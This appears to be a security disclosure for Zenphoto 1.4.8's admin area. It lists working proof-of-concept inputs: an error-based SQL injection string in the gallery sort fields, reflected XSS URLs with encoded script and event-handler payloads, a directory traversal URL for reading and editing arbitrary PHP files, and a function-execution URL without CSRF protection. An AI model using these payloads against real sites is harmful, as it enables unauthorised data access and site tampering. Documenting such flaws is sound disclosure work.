SQL Injection
=============

  There are multiple second order error based SQL injections into the
ORDER BY keyword in the admin area.

   - visit zp-core/admin-options.php?saved&tab=gallery
     alternatively visit zp-core/admin-options.php?saved&tab=image
   - Set "Sort gallery by" to "Custom"
   - set custom fields to "id,extractvalue(0x0a,concat(0x0a,(select
version())))%23"
   - visit zp-core/admin-upload.php?page=upload&tab=http&type=images
   - alternatively, visiting either of these will also trigger the injection:
    /
    zp-core/admin-edit.php
    zp-core/admin-users.php?page=users
    zp-core/admin-themes.php

  The result is only directly displayed if the server is configured to
report errors, but it can also be seen in the logfile located at
zp-core/admin-logs.php?page=logs

XSS 1
=====

  http://localhost/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php?error=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B
  http://localhost/zenphoto-zenphoto-1.4.8/zp-core/utilities/backup_restore.php?compression=%26lt%3Bscript%26gt%3Balert%281%29%26lt%3B%2Fscript%26gt%3B

    The payload must first be HTML entity-encoded, and then URL encoded.

XSS 2
=====


http://localhost/zenphoto-security-fixes/zp-core/admin.php?action=external&error="
onmouseover="alert('xsstest')" foo="bar&msg=hover over me!

Directory Traversal
===================

  For an admin, it is possible to view and edit any PHP or inc files, not
just the ones inside the theme directory.

  http://localhost/zenphoto-zenphoto-1.4.8/zp-core/admin-themes-editor.php?theme=../../../../../var/www&file=secret.php


Execute Function
================

An admin user can execute any function they want via this URL (there is
no CSRF protection for it):

    localhost/zenphoto-security-fixes/zp-core/admin.php?action=phpinfo

This gives up some control over the control flow of the site, which
might cause problems, especially considering the missing of CSRF protection.
